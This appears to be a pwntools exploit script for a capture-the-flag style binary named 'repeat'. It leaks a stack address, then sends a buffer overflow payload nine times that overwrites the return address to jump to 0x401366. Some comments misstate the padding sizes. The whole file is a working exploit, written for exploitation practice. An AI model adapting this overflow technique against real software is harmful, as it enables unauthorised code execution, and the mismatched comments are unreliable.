from pwn import *

# Set log level to debug
context.log_level = 'debug'

# Set up the process and binary
binary = './repeat'  # Replace with the correct local binary path if needed
p = process(binary)
# p = remote("localhost", 5454)  # Uncomment this line to connect to a remote server

# Receive the response until the part with the address (before the prompt)
response = p.recvuntil(b'ground: ', timeout=20)
print(response.decode())

# Receive the hexadecimal address part
hex_address = p.recvline().strip()
print(f"The extracted hexadecimal address is: {hex_address.decode()}")

# Convert the extracted address to a 64-bit integer
address_int = int(hex_address, 16)

# Wait for the > prompt
p.recvuntil(b'>')

# Offsets and padding
padding = b'A' * 72 # 64 bytes to fill the buffer
rbp_padding = b'B' * 8  # Skip over RBP (16 bytes)
return_address = p64(0x401366)  # Address just before cash is multiplied

# Construct the payload
payload = padding + p64(address_int) + rbp_padding + return_address

#send the payload 9 times
for i in range(9):
    # Send the payload
    p.sendline(payload)
    p.recvuntil(b'>', timeout=10)

# Send the payload once
#p.sendline(payload)
p.sendline(b'') 
# Print the response after sending the payload
final_response = p.recvall(timeout=10)
print("Final response after sending the payload:")
print(final_response.decode())

# Close the connection
p.close()
